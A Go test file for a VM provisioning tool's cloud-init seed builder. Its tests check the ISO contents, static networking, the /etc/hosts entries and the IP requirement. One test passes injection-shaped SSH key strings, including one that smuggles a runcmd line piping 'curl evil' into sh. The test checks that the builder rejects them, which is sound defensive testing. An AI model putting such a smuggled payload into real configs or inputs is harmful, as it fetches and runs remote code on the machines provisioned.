package cloudinit

import (
	"io"
	"os"
	"strings"
	"testing"

	"github.com/kdomanski/iso9660"

	"github.com/ForceAI-KW/umbra/internal/registry"
)

func TestBuildSeedProducesCidataISO(t *testing.T) {
	dir := t.TempDir()
	m := &registry.Machine{Name: "t1", CPUs: 2, MemoryMiB: 2048, DiskGiB: 20, Image: "ubuntu:noble", IP: "192.168.127.10"}
	hosts := map[string]string{"t1": "192.168.127.10", "other": "192.168.127.11", "skipped": ""}
	iso, err := BuildSeed(m, dir, "ssh-ed25519 AAAATEST umbra", hosts)
	if err != nil {
		t.Fatal(err)
	}
	f, err := os.Open(iso)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	img, err := iso9660.OpenImage(f)
	if err != nil {
		t.Fatal(err)
	}
	root, err := img.RootDir()
	if err != nil {
		t.Fatal(err)
	}
	children, err := root.GetChildren()
	if err != nil {
		t.Fatal(err)
	}
	found := map[string]string{}
	for _, c := range children {
		b, _ := io.ReadAll(c.Reader())
		found[c.Name()] = string(b)
	}
	ud, ok := found["user-data"]
	if !ok {
		t.Fatalf("no user-data in ISO; got %v", keys(found))
	}
	nc, ok := found["network-config"]
	if !ok {
		t.Fatalf("no network-config in ISO; got %v", keys(found))
	}
	for _, want := range []string{`addresses: [ "192.168.127.10/24" ]`, "via: \"192.168.127.1\"", "dhcp4: false"} {
		if !strings.Contains(nc, want) {
			t.Fatalf("network-config missing %q (static addressing):\n%s", want, nc)
		}
	}
	if strings.Contains(nc, "dhcp-identifier") {
		t.Fatalf("network-config still has dhcp-identifier (should be static, no DHCP):\n%s", nc)
	}
	for _, want := range []string{"#cloud-config", "ssh-ed25519 AAAATEST umbra", "name: umbra", "/mnt/mac", "virtiofs", "chrony", "local-hostname: t1"} {
		joined := ud + found["meta-data"]
		if !strings.Contains(joined, want) {
			t.Fatalf("seed missing %q", want)
		}
	}
	// hosts entries are appended to /etc/hosts via a printf runcmd (dash's
	// echo can't do -e); assert the printf line carries the IP + FQDN.
	for _, want := range []string{"192.168.127.11", ".umbra.local", "'other'", ">> /etc/hosts", "printf"} {
		if !strings.Contains(ud, want) {
			t.Fatalf("user-data missing hosts runcmd fragment %q:\n%s", want, ud)
		}
	}
	if strings.Contains(ud, "skipped.umbra.local") {
		t.Fatalf("user-data included hosts entry with empty IP:\n%s", ud)
	}
}

func keys(m map[string]string) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}

func TestBuildSeedRejectsInjectionShapedKeys(t *testing.T) {
	dir := t.TempDir()
	m := &registry.Machine{Name: "t2", CPUs: 1, MemoryMiB: 1024, DiskGiB: 10, Image: "ubuntu:noble", IP: "192.168.127.11"}
	for _, bad := range []string{
		"ssh-ed25519 AAAA umbra\nruncmd:\n  - curl evil | sh",
		"not-a-key AAAA",
		"ssh-ed25519 AAAA\r umbra",
	} {
		if _, err := BuildSeed(m, dir, bad, nil); err == nil {
			t.Fatalf("BuildSeed accepted injection-shaped key %q", bad)
		}
	}
}

func TestBuildSeedRequiresIP(t *testing.T) {
	dir := t.TempDir()
	m := &registry.Machine{Name: "t3", CPUs: 1, MemoryMiB: 1024, DiskGiB: 10, Image: "ubuntu:noble"}
	if _, err := BuildSeed(m, dir, "ssh-ed25519 AAAATEST umbra", nil); err == nil {
		t.Fatal("BuildSeed accepted a machine with no IP assigned")
	}
}
